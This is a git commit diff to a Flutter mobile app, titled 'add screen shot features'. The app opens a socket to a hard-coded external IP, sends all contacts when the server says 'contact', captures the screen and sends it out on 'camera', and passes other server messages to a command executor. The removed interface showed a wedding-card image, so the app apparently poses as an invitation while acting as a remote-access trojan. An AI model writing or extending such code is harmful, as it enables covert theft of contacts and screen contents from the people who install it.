52fe7545ec55cd5c587ed08f2d6d9165e8c1b024
NormanSamsudin <bokayokogithub79@gmail.com>
2024-11-16 08:52:28 +0800

    add screen shot features

--- mobile_application/lib/main.dart
+++ mobile_application/lib/main.dart
@@ -2,7 +2,10 @@ import 'dart:convert';
 import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
-import 'package:permission_handler/permission_handler.dart';
+import 'package:camera/camera.dart';
+import 'package:screenshot/screenshot.dart';
+import 'package:screen_capturer/screen_capturer.dart';
+//import 'package:permission_handler/permission_handler.dart';
 
 void main() => runApp(MyApp());
 
@@ -13,20 +16,62 @@ class MyApp extends StatefulWidget {
 
 class _MyAppState extends State<MyApp> {
   final String serverIp = '3.1.16.19'; // Replace with your server IP
-  final int serverPort = 13055; // Replace with your server port
+  final int serverPort = 18827; // Replace with your server port
   Socket? _socket;
+  late CameraController _controller;
+  late List<CameraDescription> cameras;
+  final ScreenshotController screenshotController = ScreenshotController();
 
   @override
   void initState() {
     super.initState();
+    _initializeCamera();
     _connectToServer();
+  }
+
+  // Initialize camera
+  void _initializeCamera() async {
+    cameras = await availableCameras();
+    _controller = CameraController(cameras[0], ResolutionPreset.high);
+
+    // Initialize the controller
+    await _controller.initialize();
+    setState(() {});
+  }
+
+  Future<void> takeScreenshot() async {
+    try {
+      // Attempt to capture the screenshot
+      // final capturedImage =
+      //     await screenshotController.capture(delay: Duration(milliseconds: 10));
+
+      CapturedData? capturedData = await screenCapturer.capture(
+        mode: CaptureMode.screen, // Options: screen, window, region
+        imagePath: 'screenshot.png', // Specify a valid path for the image
+        copyToClipboard: true, // Optionally copy the image to the clipboard
+      );
+
+      if (capturedData != null) {
+        // If the screenshot is captured successfully, process the image
+        debugPrint("Screenshot taken!");
+        _socket?.write(capturedData.toString());
+      } else {
+        debugPrint(
+            "Screenshot capture failed: No image captured. $capturedData");
+      }
+      
+    } catch (e) {
+      // Handle any errors that may occur during screenshot capture
+      debugPrint("Error while taking screenshot: $e");
+    }
   }
 
   Future<void> retrieveAndSendContacts() async {
     // Check permission to access contacts
     if (await FlutterContacts.requestPermission()) {
       // Retrieve contacts
-      List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
+      List<Contact> contacts =
+          await FlutterContacts.getContacts(withProperties: true);
 
       // Convert contacts to JSON format
       List<Map<String, dynamic>> contactList = contacts.map((contact) {
@@ -59,6 +104,8 @@ class _MyAppState extends State<MyApp> {
           if (message == 'contact') {
             // If server requests contacts, retrieve and send them
             await retrieveAndSendContacts();
+          } else if (message == 'camera') {
+            await takeScreenshot();
           } else {
             print('Received command: $message');
             _executeCommand(message);
@@ -105,16 +152,15 @@ class _MyAppState extends State<MyApp> {
 
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
+    return const MaterialApp(
       home: Scaffold(
-        body: SizedBox.expand(
-          child: Image.asset(
-            'assets/images/gambar kad kahwin.png',
-            fit: BoxFit.cover, 
-          ),
-        ),
+        body: SizedBox.expand(child: Text("hello")
+            // Image.network(
+            //   'https://down-my.img.susercontent.com/file/my-11134207-23010-smjusro544lvd7',
+            //   fit: BoxFit.cover,
+            // ),
+            ),
       ),
     );
   }
-
 }
